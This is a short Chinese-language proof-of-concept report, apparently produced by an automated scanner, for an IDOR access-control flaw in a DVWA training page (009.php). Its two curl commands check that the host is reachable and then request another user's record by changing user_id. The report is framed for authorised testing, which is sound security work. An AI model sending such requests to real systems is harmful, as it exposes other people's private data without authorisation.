# POC — DVWA 用户资料页通过硬编码 token 绕过访问控制，任意读取他人资料（IDOR/BAC）

- finding_id: `LLM-c8fa3f82d085`
- type: `idor` / CWE-639
- severity: `high`
- file: `009.php:47`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/009.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 越权 / IDOR 载荷**  
```http
curl -sS -i -X GET 'http://TARGET:8080/009.php?user_id=2'
```
预期：使用其他对象 ID 返回他人数据或执行他人操作。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。